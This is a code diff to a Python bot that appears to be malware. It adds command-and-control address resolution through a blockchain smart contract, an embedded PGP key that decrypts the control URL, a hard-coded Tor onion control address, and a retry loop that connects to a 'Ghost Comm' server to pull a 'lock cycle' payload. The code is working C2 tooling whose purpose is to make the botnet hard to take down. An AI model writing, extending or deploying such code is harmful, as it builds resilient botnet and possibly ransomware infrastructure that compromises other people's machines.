@@ -1,33 +1,41 @@
-import os
-import sys
-import socket
-import subprocess
+import argparse
 import base64
+import csv
+import getpass
+import io
+import ipaddress
 import json
-import time
-import random
-import threading
-import platform
-import socks
 import logging
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad, unpad
-from scapy.all import sr, IP, ICMP, TCP, ARP, Ether
-from netaddr import IPNetwork, IPAddress
+import os
+import platform
+import random
+import shutil
+import socket
+import socks
+import stat
+import subprocess
+import sys
+import tarfile
+import threading
+import time
+import urllib.request
+import zipfile
+from pathlib import Path
+from subprocess import PIPE, Popen
+from typing import Optional
+
+import cv2
+import pgpy
+import psutil
 import requests
 import stem
-import shutil
-import getpass
-import argparse
-import zipfile, io
-import urllib.request, ipaddress
-import tarfile
-import cv2
-import psutil
-from subprocess import Popen, PIPE
-import csv
-import stat
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+from netaddr import IPAddress, IPNetwork
+from scapy.all import ARP, Ether, ICMP, IP, TCP, sr
 
+import blockchain_utils
+from ghost_comm_lib import client as ghost_client_module
 from ghost_comm_lib.client.client import Client as GhostCommClient
 
 # Tor Expert Bundle URLs
@@ -49,6 +57,182 @@ TOR_PORT = 9050
 DEFAULT_CONTROL_URL = "http://zidveflgk5ab3mfoqgmq35fulrmklpbbdexpfj2lscdbqmqruqjz2qyd.onion"
 _control_url_lock = threading.Lock()
 _current_control_url = DEFAULT_CONTROL_URL
+
+EMBEDDED_PGP_KEY_B64 = (
+    "LS0tLS1CRUdJTiBQR1AgUFVCTElDIEtFWSBCTE9DSy0tLS0tCgptUUdOQkdqMUo1VUJEQUMzVHgv"
+    "eTlaeVNvV1FUUUNlWGhQajJSdHQrUVFDNWc2b3JvK1ZjS09maWs3TVRaZXA3CmhFbEFkVmJYZjRS"
+    "REZmT2cxQWJqaDdHMWxlUmRLaEZKakxBK09haUZLVnN1a0VIWmhwbVROdmJTQW9hSU9aM0gKRnNQ"
+    "b3V0V0FmV1dnR3FOWEhhWGkyK29GZ3cxN1hidDY3L0phQWFVQXdUcTBPWUhKcjhzenUvTGtod1li"
+    "cnhZVAplaEdTWWd1NTh4bDV2QldLRkdTbExkVVo5a05tVktZaG5hamRBdVl5Q0hkckgwbTREMlVP"
+    "K2duUUplL213M3RXCjc3N2ZIaHZ0SG5XZGdSTGUyNlRNOTlET0JpZGZDazI3UnhPcVdnaXB0bFFi"
+    "Y3JpcjdNMVpkUXhPbzNFbkdpZEsKZU5yME44TXdyVG9wTVIwTUpoK21Ta29EUHZNdFVWK000Z2xj"
+    "MGJPZUNWQ0NVaG00RnM4TUNVQXk2eUN3cXI1MgpOajJJTUxqeExhbUFaenJvNmhCTUhOTmdGUTJC"
+    "R05VeUNMTk53dVlYM0puR3IySk83Z29FQjdMbTdUNnhYQTUwCjFDbEI4SjZGNCtjek5iRDZvZWYv"
+    "aHZSRVcwNUNjbDdnR3RRa2RSYmdSbEIrNTRiYWwwUHdBWkJpMStDS0d3cHYKNjBsZ21hZ0k3c1Ex"
+    "azNrQUVRRUFBYlFVWDFvelVqQmZJRHd0TFMwdExVQXRMUzB0TFQ2SkFjNEVFd0VLQURnVwpJUVIv"
+    "blFmYjJqUXlNWXhBVVFLKzJ5dWlwVS9PalFVQ2FQVW5sUUliQXdVTENRZ0hBZ1lWQ2drSUN3SUVG"
+    "Z0lECkFRSWVBUUlYZ0FBS0NSQysyeXVpcFUvT2pTOVZEQUN4WUZ1OXdXNVVlSkxYRGdvWHBYb0h0"
+    "VWJtZzJrNFUyWTUKOFhCVU9tZWlXOEtWOWxaVlB4Qm1EL3lpeEhVbEYyVDI2MDdXN1Jubnd4c05r"
+    "RWVEQmw0cVM5aHcxZk9jU09vbgpMNms0RnZHdmhBcW5NZWQvYjA1TUlmWjN4MStjRXRCbW13Q0Ji"
+    "aitNbnkrUW1ieC9KZFlRZWlmZmtiZjQ2b1hvCmZXTWJ2SkZvQVd6b01rUnpLc2VYVlBLSWFWb2V0"
+    "eDdMbWFBUVM5UnZhbXVaSWhSd2xkb1VWczVxV3NGdWJQYWUKdmNHZGxBcVN4bjFlODlFenRvMW0w"
+    "R1djS3kwOHpCamp3UG9QdGR3TCtBU1h3RWc1MnBSQmRLL1R5YlkxclBiaQpYdlJabUIyU2RtaGhz"
+    "ejJsWEF1VUZjTzM0RXBLMDBWdWdqdENPZVdTTW9Id0t0SjZFRkxqOVNVR1RickdlQlA0CitQQ0RZ"
+    "c1NkMVVnU2xFbWNSKzdObnUvZ0gxSHVrM053YTg3Zis2b2RUUTJOaW9pZEV2TjdHQ3FPVzZHOXhF"
+    "S2YKN3hKWmhxZ04xT0J0ems3b0pWUWYzNWdUNVhIYUlaNDJUTkkrcHZGdUc5eHRuTlRaZ3BQSE1D"
+    "Q3NNNm5yZitoZwpCUlZocEZmNE5yUkdaQ2dZZEJlSmhzQlAwVytsdXkyNUFZMEVhUFVubFFFTUFM"
+    "QlhtWkFYU1YrbnlMSWFjVG5nCkJOQ0VaVy9lOXR2UjRUYnNRN1o1a1Bxa1FqYWdvWDB5Si8wZXhj"
+    "eVhqUHNhZmdvVDhHWjE5d05WZWV2Nk5SVHcKV3FXSU5ubGEwVkFEWHFWbTB5a0RuampBSGhUOHI2"
+    "V2dRb21aNlFiMGhFNXZHUU9DcmorOVcwdytVVVZpN1M3bApCTTZ1Q0lXTWh6cnQ2YVFKUDMycllv"
+    "N01tM2hLTWNqODkrd1lkdmxVaFN3ZEZtNzB3YkY2cmhZS2RGS1VDSkgxCnM2TW13akNvMUJidWZN"
+    "MHFETW9TRHFRSE1qcW9mUVVSTEZiMFVXNEVEZFZzQ3VrdlIvVm5xNHB4Tm5TdFJVcGoKZ0t4WkJn"
+    "SWVuN1I5V1lEdHlMTW82Q0RUZjE1SlpTWmE4VW9BNVhMUFZ3eGUvUU1CQ0s3UEVOV3R1clpRc3VH"
+    "YgprbHZMWFlDM1lGbFlJZjlheVN0SE83TWw1STMrQVJ2V2lXRm1ON2xjeC90bzlDbE1nemtDMXpx"
+    "UEk1c3lxcy84ClFqRStWS3N6dUlzOHYvdHBoeGJZd3pXc01sRmJhWjdZejdLV0FLNXNOc2lnUGpk"
+    "ckVFaDFFYURMSXdHWTNwRlIKcS9KRkc1akFOa2JtRm15UFhUYUJQYUprUkloUGZiVFZEZ0NZNjZH"
+    "S1RFUDdxUUFSQVFBQmlRRzJCQmdCQ2dBZwpGaUVFZjUwSDI5bzBNakdNUUZFQ3Z0c3JvcVZQem8w"
+    "RkFtajFKNVVDR3d3QUNna1F2dHNyb3FWUHpvM0gvQXYvClgzdlJ5QkFmQU5HTFk4UUVKTHF4L1JY"
+    "ckExWHBwYVlEMk9LbXprMW8zdFpnYnhBSGRSWHBBRXhmM0VOdVJmZDQKN09rZk1QdURzMEJtcTR3"
+    "S0RlUEZqR1dPTCs3T0hVRXRtRnFIS1ZLOHJDaHNPSFlHblZYWVExdW9ad3hFclVYeAo2c2FpUy9W"
+    "NUZhRThwRXRwR0c1OSsvTkNrVTFWbTlRRkt4b1QwSHJSd0ZRaWRFY0hHMit6RlEyYkowYTlmT2N1"
+    "CkcwV2VBMVZzNUdjMXZOR2JzS2diMHlvNUgzRU1ZdEpKNVBGUlBuTjN3ejRyaG56bmtKeEZvV2hk"
+    "ZW4wNlhDQmUKRFpoYlBpS2N6QUNjUnpIaUZhWjdsUFl4RGozL1pldVZkNmxDa3R2S0dER2lYTzFt"
+    "bHp3OWRHOFNZYXJFQUhGNAp6L21UTVllLzN3Myswc0owUkFZTmNKSmFuM1FNb3JPQU10YlRZYUtt"
+    "cGxmRTBiTFRDWktTRWlYekxpTDBENWtNCnJyRk4rd1pKSDc0T2xOSE5saGxSa0dTcGIzS3E2M29H"
+    "Z21aOFpEdytoQmlmeTVXNDhXZFA3VWdZV09mcTc5TE8KL2dTN0FIKzBUQW5QQkRCanUvNzZQdmpP"
+    "N1lpZnB3QmpKeE5nODNQVE9OS3FicWZVQ0FIbnUwaXVDYzNQT1ZkUwo9d1lEeQotLS0tLUVORCBQ"
+    "R1AgUFVCTElDIEtFWSBCTE9DSy0tLS0tCg=="
+)
+
+_CONTRACT_META_CACHE: Optional[dict] = None
+_EMBEDDED_PGP_KEY_CACHE: Optional[pgpy.PGPKey] = None
+
+
+def _candidate_contract_meta_paths() -> list[Path]:
+    candidates: list[Path] = []
+
+    env_path = os.environ.get("C2_CONTRACT_META")
+    if env_path:
+        candidates.append(Path(env_path).expanduser())
+
+    module_path = Path(__file__).resolve()
+    candidates.append(module_path.parent / "contract_meta.json")
+    candidates.append(Path.cwd() / "contract_meta.json")
+
+    try:
+        ghost_module_path = Path(ghost_client_module.__file__).resolve()
+        candidates.append(ghost_module_path.parent / "contract_meta.json")
+        candidates.append(ghost_module_path.parent.parent / "contract_meta.json")
+    except Exception:
+        pass
+
+    seen: set[Path] = set()
+    unique: list[Path] = []
+    for candidate in candidates:
+        try:
+            resolved = candidate.resolve()
+        except Exception:
+            resolved = candidate
+        if resolved in seen:
+            continue
+        seen.add(resolved)
+        unique.append(resolved)
+    return unique
+
+
+def _load_contract_meta() -> Optional[dict]:
+    global _CONTRACT_META_CACHE
+    if _CONTRACT_META_CACHE is not None:
+        return _CONTRACT_META_CACHE
+
+    for path in _candidate_contract_meta_paths():
+        if not path.is_file():
+            continue
+        try:
+            with path.open("r", encoding="utf-8") as fh:
+                _CONTRACT_META_CACHE = json.load(fh)
+                return _CONTRACT_META_CACHE
+        except Exception as exc:
+            logging.getLogger("ControlURL").warning(f"Failed to load contract metadata from {path}: {exc}")
+    return None
+
+
+def _load_embedded_pgp_key() -> Optional[pgpy.PGPKey]:
+    global _EMBEDDED_PGP_KEY_CACHE
+    if _EMBEDDED_PGP_KEY_CACHE is not None:
+        return _EMBEDDED_PGP_KEY_CACHE
+
+    logger = logging.getLogger("ControlURL")
+    try:
+        key_bytes = base64.b64decode(EMBEDDED_PGP_KEY_B64.encode("ascii"))
+        key, _ = pgpy.PGPKey.from_blob(key_bytes)
+        _EMBEDDED_PGP_KEY_CACHE = key
+    except Exception as exc:
+        logger.error(f"Failed to load embedded PGP key: {exc}")
+        _EMBEDDED_PGP_KEY_CACHE = None
+    return _EMBEDDED_PGP_KEY_CACHE
+
+
+def _decrypt_control_url_blob(encrypted_blob: str) -> Optional[str]:
+    key = _load_embedded_pgp_key()
+    if not key:
+        return None
+
+    logger = logging.getLogger("ControlURL")
+    try:
+        message = pgpy.PGPMessage.from_blob(encrypted_blob)
+        decrypted = key.decrypt(message)
+        if decrypted.is_encrypted:
+            logger.warning("Decrypted PGP message still marked as encrypted.")
+            return None
+        plaintext = decrypted.message
+        if isinstance(plaintext, bytes):
+            return plaintext.decode("utf-8", "ignore").strip()
+        return str(plaintext).strip()
+    except Exception as exc:
+        logger.warning(f"Failed to decrypt control URL payload: {exc}")
+        return None
+
+
+def fetch_control_url_from_blockchain(logger: Optional[logging.Logger] = None) -> str:
+    meta = _load_contract_meta()
+    if not meta:
+        if logger:
+            logger.warning("Contract metadata not available; using default control URL.")
+        return DEFAULT_CONTROL_URL
+
+    try:
+        web3 = blockchain_utils.get_web3()
+        contract = blockchain_utils.get_contract_instance(web3, meta["address"], meta["abi"])
+        raw_value = contract.functions.getC2Url().call()
+    except Exception as exc:
+        if logger:
+            logger.warning(f"Failed to query control URL from blockchain: {exc}")
+        return DEFAULT_CONTROL_URL
+
+    if not raw_value:
+        return DEFAULT_CONTROL_URL
+
+    if isinstance(raw_value, bytes):
+        raw_value = raw_value.decode("utf-8", "ignore")
+
+    try:
+        payload = json.loads(raw_value)
+    except (TypeError, json.JSONDecodeError):
+        sanitized = str(raw_value).strip()
+        return sanitized or DEFAULT_CONTROL_URL
+
+    encrypted_blob = payload.get("encrypted_control_url")
+    if encrypted_blob:
+        decrypted = _decrypt_control_url_blob(encrypted_blob)
+        if decrypted:
+            return decrypted
+
+    primary = payload.get("primary_node")
+    if isinstance(primary, str) and primary.strip():
+        return primary.strip()
+
+    return DEFAULT_CONTROL_URL
 
 def get_current_control_url():
     """Return the most recent control URL the bot knows about."""
@@ -531,12 +715,14 @@ if __name__ == '__main__':
 
             # --- Configuration ---
             def get_c2_address():
-                logger.info("Attempting to determine C2 address...")
-                # In a real scenario, this would involve querying the blockchain or a fallback mechanism
-                # For now, we'll use the default onion address
-                return DEFAULT_CONTROL_URL
+                logger.info("Attempting to determine C2 address via blockchain registry...")
+                resolved = fetch_control_url_from_blockchain(logger)
+                update_control_url(resolved)
+                logger.info(f"Using control URL: {resolved}")
+                return resolved
 
             C2_SERVER = get_c2_address()
+            logger.debug(f"Initial control URL resolved to: {C2_SERVER}")
             BOT_ID = f"{platform.node()}-{os.getpid()}"
             ENCRYPTION_KEY = b'sixteen byte key'
             MODULES_DIR = 'MODULES'
@@ -544,11 +730,40 @@ if __name__ == '__main__':
             logger.debug("Core configuration variables set.")
 
             # --- Ghost Comm Client ---
-            ghost_comm_client = GhostCommClient(name=BOT_ID, email=f"{BOT_ID}@localhost")
-            ghost_comm_client.primary_node_host = C2_SERVER
-            ghost_comm_client.connect_to_primary_node()
-            decrypted_payload = ghost_comm_client.request_lock_cycle_payload()
-            ghost_comm_client.close_connection()
+            ghost_comm_client: Optional[GhostCommClient] = None
+            decrypted_payload: Optional[dict] = None
+
+            while True:
+                current_url = fetch_control_url_from_blockchain(logger)
+                update_control_url(current_url)
+                logger.info(f"Attempting Ghost Comm connection via {current_url}")
+
+                client = GhostCommClient(name=BOT_ID, email=f"{BOT_ID}@localhost")
+                client.primary_node_host = current_url
+
+                try:
+                    client.connect_to_primary_node()
+                    decrypted_payload = client.request_lock_cycle_payload()
+                    ghost_comm_client = client
+                    C2_SERVER = current_url
+                    logger.info("Successfully retrieved payload from Ghost Comm.")
+                    break
+                except Exception as exc:
+                    logger.warning(f"Failed to connect to Ghost Comm: {exc}. Retrying in 5 seconds.")
+                    try:
+                        client.close_connection()
+                    except Exception:
+                        pass
+                    time.sleep(5)
+
+            if ghost_comm_client:
+                try:
+                    ghost_comm_client.close_connection()
+                except Exception:
+                    pass
+
+            if decrypted_payload is None:
+                decrypted_payload = {}
 
             # --- C2 Logging Handler ---
             class C2LogHandler(logging.Handler):
